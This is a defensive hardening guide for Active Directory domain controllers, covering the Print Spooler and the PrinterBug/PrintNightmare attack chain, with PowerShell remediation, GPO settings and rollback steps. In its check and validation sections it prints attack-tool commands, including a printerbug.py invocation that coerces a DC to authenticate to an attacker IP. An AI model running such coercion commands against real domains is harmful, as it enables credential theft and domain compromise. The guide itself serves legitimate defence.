# Print Spooler Running on Domain Controllers

**Category:** Legacy
**Operational Risk of Remediation:** Very Low
**Attacker Skill Required to Exploit:** Low (PrinterBug / SpoolSample)

## What it is

The Windows Print Spooler service has a long history of vulnerabilities, most notably PrintNightmare (CVE-2021-34527) and the "Printer Bug" (`MS-RPRN`), which lets any authenticated user coerce the spooler service on a remote host into authenticating to an arbitrary destination. When that remote host is a Domain Controller and the destination is an attacker-controlled box configured with unconstrained delegation, the result is the DC's machine account TGT in the attacker's hands → DCSync → domain compromise.

There is **no good reason** for the Print Spooler service to be running on a Domain Controller. DCs do not print.

## What attack it enables

- Coerced authentication of the DC machine account.
- Combined with unconstrained delegation, full domain compromise.
- Combined with NTLM relay to ADCS (ESC8), full domain compromise without any cracking required.
- Exposure to current and future Spooler vulnerabilities (the service has had ~30 CVEs).

MITRE ATT&CK: T1187, T1557

## How to confirm it's present in your environment

```powershell
# On each DC
Get-Service -Name Spooler | Select-Object Status, StartType
# If Status = Running, you have the problem.
```

External check, does the DC respond to `MS-RPRN` requests?
```bash
# From an attacker / test host
rpcdump.py @<dc-ip> | grep -i print
# Or use SpoolSample.exe / printerbug.py
```

## What to audit before remediation

The audit on this one is mercifully short:
- Is anyone printing from a DC? No.
- Does any application on the DC need the spooler to enumerate printers? Almost certainly no and if yes, that application should not be running on a DC.
- Does any monitoring agent depend on the spooler? Check whether your monitoring tool flags Spooler as a critical service. Some legacy monitoring profiles include it by default; remove the dependency.

## Remediation

```powershell
# On each DC
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```

Do this via GPO scoped to the Domain Controllers OU for consistency:

`Computer Configuration → Policies → Windows Settings → Security Settings → System Services → Print Spooler → Define this policy setting → Disabled`

While you're there, also harden against PrintNightmare on every member server and workstation that *does* need to print:

`Computer Configuration → Policies → Administrative Templates → Printers`:
- `Allow Print Spooler to accept client connections = Disabled` (on machines that don't need to *be* a print server)
- `Point and Print Restrictions = Enabled`, with elevation prompts for both install and update
- `Limits print driver installation to Administrators = Enabled`

## What might break

Disabling Spooler on DCs: nothing in any environment that doesn't have a profoundly misconfigured DC.

The broader Point and Print restrictions on workstations may interfere with self-service printer installs in environments that allow that, but the modern answer is "don't allow that," push printers via GPO or print management instead.

## Rollback

```powershell
Set-Service -Name Spooler -StartupType Automatic
Start-Service -Name Spooler
```
Effective immediately.

## Validate the fix

```powershell
Get-Service -Name Spooler | Select-Object Status, StartType
# Stopped, Disabled
```

External validation:
```bash
# PrinterBug attempt should fail
printerbug.py example.local/user:password@<dc-ip> <attacker-ip>
# Expect: connection refused / endpoint not found
```

## References

- Microsoft: [CVE-2021-34527 — Windows Print Spooler RCE (PrintNightmare)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
- Will Schroeder & Lee Christensen: [The Printer Bug](https://github.com/leechristensen/SpoolSample)
- Microsoft: [Manage Print Spooler security](https://learn.microsoft.com/en-us/troubleshoot/windows-server/printing/manage-print-spooler-security)
- MITRE ATT&CK: T1187
